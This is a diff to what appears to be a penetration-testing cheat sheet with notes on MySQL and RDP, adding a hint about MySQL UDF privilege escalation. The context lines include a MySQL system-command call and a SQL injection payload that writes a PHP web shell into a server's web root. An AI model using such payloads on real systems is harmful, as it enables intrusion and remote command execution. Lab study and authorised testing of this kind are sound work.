@@ -56,6 +56,8 @@ MYSQL - Port 3306:
   - select do_system('id'); //to run system commands from mysql shell.
   - Great resource: https://book.hacktricks.xyz/pentesting/pentesting-mysql 
   - Incase of sql injection: ' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
+  - if MYSQL is running as root, you can abuse UDF exploit for privelege escalation. (Reference: https://www.trenchesofit.com/2021/02/15/offensive-security-proving-grounds-banzai-write-up-no-metasploit/)
+    - While exploiting UDF you may find size smaller than 0 error, i fixed it by changing the binary name.
  
 *RDP - Port 3386:
   - Credential re use to login.
